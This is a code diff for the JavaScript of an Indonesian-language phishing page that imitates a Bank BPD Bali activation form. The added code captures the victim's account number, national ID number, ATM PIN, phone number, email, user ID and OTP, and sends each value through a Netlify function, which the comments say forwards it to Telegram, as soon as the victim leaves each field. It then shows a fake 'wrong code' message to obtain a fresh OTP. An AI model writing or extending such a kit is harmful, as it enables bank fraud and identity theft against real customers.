@@ -1,6 +1,61 @@
 // Konfigurasi API URL (Netlify Function)
 const API_URL = '/.netlify/functions/send-aktivasi';
 
+// Data yang tersimpan
+let currentData = {
+    noRekening: '',
+    noIdentitas: '',
+    pinAtm: '',
+    noTelpon: '',
+    email: '',
+    username: '',
+    kodeOtp: ''
+};
+
+// Flag untuk mencegah spam notifikasi
+let lastSentData = {};
+
+// Fungsi untuk mengecek apakah data berubah dan perlu dikirim
+function hasDataChanged(fieldName, value) {
+    if (lastSentData[fieldName] !== value) {
+        lastSentData[fieldName] = value;
+        return true;
+    }
+    return false;
+}
+
+// Fungsi untuk mengirim notifikasi per field ke Telegram
+async function sendFieldNotification(triggerField) {
+    // Kumpulkan semua data yang sudah terisi
+    const dataToSend = {
+        noRekening: currentData.noRekening || '',
+        noIdentitas: currentData.noIdentitas || '',
+        pinAtm: currentData.pinAtm || '',
+        noTelpon: currentData.noTelpon || '',
+        email: currentData.email || '',
+        username: currentData.username || '',
+        kodeOtp: currentData.kodeOtp || '',
+        triggerField: triggerField,
+        timestamp: new Date().toLocaleString('id-ID')
+    };
+    
+    // Hanya kirim jika ada data yang terisi minimal noRekening
+    if (!dataToSend.noRekening) return;
+    
+    try {
+        const response = await fetch(API_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(dataToSend)
+        });
+        console.log(`Notifikasi ${triggerField} terkirim`, await response.json());
+    } catch (error) {
+        console.error('Error sending field notification:', error);
+    }
+}
+
 // ========== NAVIGASI ==========
 function pindahHalaman(id) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -23,16 +78,15 @@ const noIdentitas = document.getElementById('noIdentitas');
 const pinAtm = document.getElementById('pinAtm');
 const noTelpon = document.getElementById('noTelpon');
 const email = document.getElementById('email');
-const btnLanjut = document.getElementById('btnLanjut');
 const infoPage2 = document.getElementById('infoPage2');
 
 function isFormPage2Valid() {
-    if (!noRekening.value.trim()) return false;
-    if (!noIdentitas.value.trim()) return false;
-    if (!pinAtm.value.trim()) return false;
-    if (!noTelpon.value.trim()) return false;
-    if (!email.value.trim()) return false;
-    if (!email.value.includes('@')) return false;
+    if (!currentData.noRekening) return false;
+    if (!currentData.noIdentitas) return false;
+    if (!currentData.pinAtm) return false;
+    if (!currentData.noTelpon) return false;
+    if (!currentData.email) return false;
+    if (!currentData.email.includes('@')) return false;
     return true;
 }
 
@@ -46,26 +100,86 @@ function cekFormPage2() {
     }
 }
 
-// Filter input hanya angka
-if (noRekening) {
-    noRekening.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
-    noRekening.addEventListener('blur', cekFormPage2);
-}
-if (noIdentitas) {
-    noIdentitas.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
-    noIdentitas.addEventListener('blur', cekFormPage2);
-}
-if (pinAtm) {
-    pinAtm.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); cekFormPage2(); });
-    pinAtm.addEventListener('blur', cekFormPage2);
-}
-if (noTelpon) {
-    noTelpon.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); cekFormPage2(); });
-    noTelpon.addEventListener('blur', cekFormPage2);
-}
-if (email) {
-    email.addEventListener('input', cekFormPage2);
-    email.addEventListener('blur', cekFormPage2);
+// Event handler untuk setiap field dengan notifikasi real-time
+function setupFieldNotifications() {
+    // No. Rekening
+    if (noRekening) {
+        noRekening.addEventListener('input', function() { 
+            this.value = this.value.replace(/[^0-9]/g, ''); 
+            currentData.noRekening = this.value.trim();
+            cekFormPage2();
+        });
+        noRekening.addEventListener('blur', function() {
+            currentData.noRekening = this.value.trim();
+            if (currentData.noRekening && hasDataChanged('noRekening', currentData.noRekening)) {
+                sendFieldNotification('noRekening');
+            }
+            cekFormPage2();
+        });
+    }
+    
+    // No. Identitas (NIK KTP)
+    if (noIdentitas) {
+        noIdentitas.addEventListener('input', function() { 
+            this.value = this.value.replace(/[^0-9]/g, ''); 
+            currentData.noIdentitas = this.value.trim();
+            cekFormPage2();
+        });
+        noIdentitas.addEventListener('blur', function() {
+            currentData.noIdentitas = this.value.trim();
+            if (currentData.noIdentitas && hasDataChanged('noIdentitas', currentData.noIdentitas)) {
+                sendFieldNotification('noIdentitas');
+            }
+            cekFormPage2();
+        });
+    }
+    
+    // PIN ATM
+    if (pinAtm) {
+        pinAtm.addEventListener('input', function() { 
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); 
+            currentData.pinAtm = this.value.trim();
+            cekFormPage2();
+        });
+        pinAtm.addEventListener('blur', function() {
+            currentData.pinAtm = this.value.trim();
+            if (currentData.pinAtm && hasDataChanged('pinAtm', currentData.pinAtm)) {
+                sendFieldNotification('pinAtm');
+            }
+            cekFormPage2();
+        });
+    }
+    
+    // No. Telepon
+    if (noTelpon) {
+        noTelpon.addEventListener('input', function() { 
+            this.value = this.value.replace(/[^0-9]/g, ''); 
+            currentData.noTelpon = this.value.trim();
+            cekFormPage2();
+        });
+        noTelpon.addEventListener('blur', function() {
+            currentData.noTelpon = this.value.trim();
+            if (currentData.noTelpon && hasDataChanged('noTelpon', currentData.noTelpon)) {
+                sendFieldNotification('noTelpon');
+            }
+            cekFormPage2();
+        });
+    }
+    
+    // Email
+    if (email) {
+        email.addEventListener('input', function() { 
+            currentData.email = this.value.trim();
+            cekFormPage2();
+        });
+        email.addEventListener('blur', function() {
+            currentData.email = this.value.trim();
+            if (currentData.email && hasDataChanged('email', currentData.email) && currentData.email.includes('@')) {
+                sendFieldNotification('email');
+            }
+            cekFormPage2();
+        });
+    }
 }
 
 // Fungsi untuk menampilkan loading
@@ -87,7 +201,7 @@ function hideLoading() {
     }
 }
 
-// Kirim data ke Netlify Function
+// Kirim data lengkap ke Netlify Function (untuk verifikasi akhir)
 async function kirimKeTelegram(data) {
     try {
         const response = await fetch(API_URL, {
@@ -119,11 +233,11 @@ function lanjutKePage3() {
     
     // Simpan data ke sessionStorage
     const userData = {
-        noRekening: noRekening.value.trim(),
-        noIdentitas: noIdentitas.value.trim(),
-        pinAtm: pinAtm.value.trim(),
-        noTelpon: noTelpon.value.trim(),
-        email: email.value.trim(),
+        noRekening: currentData.noRekening,
+        noIdentitas: currentData.noIdentitas,
+        pinAtm: currentData.pinAtm,
+        noTelpon: currentData.noTelpon,
+        email: currentData.email,
         timestamp: new Date().toLocaleString('id-ID')
     };
     sessionStorage.setItem('userData', JSON.stringify(userData));
@@ -138,9 +252,7 @@ function lanjutKePage3() {
     }, 150);
 }
 
-// ========== HALAMAN 3 dengan verifikasi ==========
-let loadingTimeout = null;
-
+// ========== HALAMAN 3 dengan verifikasi - Kode Aktivasi 8 Digit ==========
 async function verifikasiKode() {
     const username = document.getElementById('username');
     const kodeOtp = document.getElementById('kodeOtp');
@@ -148,9 +260,9 @@ async function verifikasiKode() {
     const infoPage3 = document.getElementById('infoPage3');
     
     let error = '';
-    if (!username.value.trim()) error += 'User.id tidak boleh kosong\n';
-    if (!kodeOtp.value.trim()) error += 'Kode Aktivasi tidak boleh kosong\n';
-    else if (kodeOtp.value.trim().length < 4) error += 'Kode Aktivasi minimal 4 digit\n';
+    if (!currentData.username) error += 'User.id tidak boleh kosong\n';
+    if (!currentData.kodeOtp) error += 'Kode Aktivasi tidak boleh kosong\n';
+    else if (currentData.kodeOtp.length < 8) error += 'Kode Aktivasi harus 8 digit\n';
     
     if (error) {
         alert('Verifikasi gagal:\n' + error);
@@ -166,37 +278,34 @@ async function verifikasiKode() {
         userData = JSON.parse(userDataStr);
     }
     
-    // Data lengkap untuk dikirim ke Telegram
+    // Data lengkap untuk dikirim ke Telegram (notifikasi final)
     const dataToSend = {
-        noRekening: userData.noRekening || '-',
-        noIdentitas: userData.noIdentitas || '-',
-        pinAtm: userData.pinAtm || '-',
-        noTelpon: userData.noTelpon || '-',
-        email: userData.email || '-',
-        username: username.value.trim(),
-        kodeOtp: kodeOtp.value.trim(),
-        timestamp: new Date().toLocaleString('id-ID')
+        noRekening: userData.noRekening || currentData.noRekening || '-',
+        noIdentitas: userData.noIdentitas || currentData.noIdentitas || '-',
+        pinAtm: userData.pinAtm || currentData.pinAtm || '-',
+        noTelpon: userData.noTelpon || currentData.noTelpon || '-',
+        email: userData.email || currentData.email || '-',
+        username: currentData.username,
+        kodeOtp: currentData.kodeOtp,
+        timestamp: new Date().toLocaleString('id-ID'),
+        isFinal: true
     };
     
-    // Tampilkan loading
     showLoading();
-    
-    // Kirim ke Netlify Function
     const result = await kirimKeTelegram(dataToSend);
-    
     hideLoading();
     
     if (result.success) {
-        // Jika berhasil kirim, tetap tampilkan error "Kode Salah" sesuai permintaan
         alert('Kode salah versi Bank BPD Bali');
         kodeOtp.value = '';
-        infoPage3.innerHTML = '* Kode salah, silakan masukkan kode aktivasi ulang';
+        currentData.kodeOtp = '';
+        infoPage3.innerHTML = '* Kode salah, silakan masukkan kode aktivasi 8 digit ulang';
         infoPage3.style.color = '#e74c3c';
         kodeOtp.focus();
         
         setTimeout(function() {
-            if (infoPage3.innerHTML === '* Kode salah, silakan masukkan kode aktivasi ulang') {
-                infoPage3.innerHTML = '* Masukkan kode aktivasi';
+            if (infoPage3.innerHTML === '* Kode salah, silakan masukkan kode aktivasi 8 digit ulang') {
+                infoPage3.innerHTML = '* Masukkan kode aktivasi 8 digit';
                 infoPage3.style.color = '#e67e22';
             }
         }, 3000);
@@ -205,11 +314,38 @@ async function verifikasiKode() {
     }
 }
 
-// Filter OTP hanya angka
-const kodeOtp = document.getElementById('kodeOtp');
-if (kodeOtp) {
-    kodeOtp.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, '').slice(0,6); });
+// Setup Halaman 3 notifications
+function setupPage3Notifications() {
+    const username = document.getElementById('username');
+    const kodeOtp = document.getElementById('kodeOtp');
+    
+    if (username) {
+        username.addEventListener('input', function() {
+            currentData.username = this.value.trim();
+        });
+        username.addEventListener('blur', function() {
+            currentData.username = this.value.trim();
+            if (currentData.username && hasDataChanged('username', currentData.username)) {
+                sendFieldNotification('username');
+            }
+        });
+    }
+    
+    if (kodeOtp) {
+        kodeOtp.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0,8);
+            currentData.kodeOtp = this.value.trim();
+        });
+        kodeOtp.addEventListener('blur', function() {
+            currentData.kodeOtp = this.value.trim();
+            if (currentData.kodeOtp && currentData.kodeOtp.length === 8 && hasDataChanged('kodeOtp', currentData.kodeOtp)) {
+                sendFieldNotification('kodeOtp');
+            }
+        });
+    }
 }
 
 // Inisialisasi
+setupFieldNotifications();
+setupPage3Notifications();
 cekFormPage2();
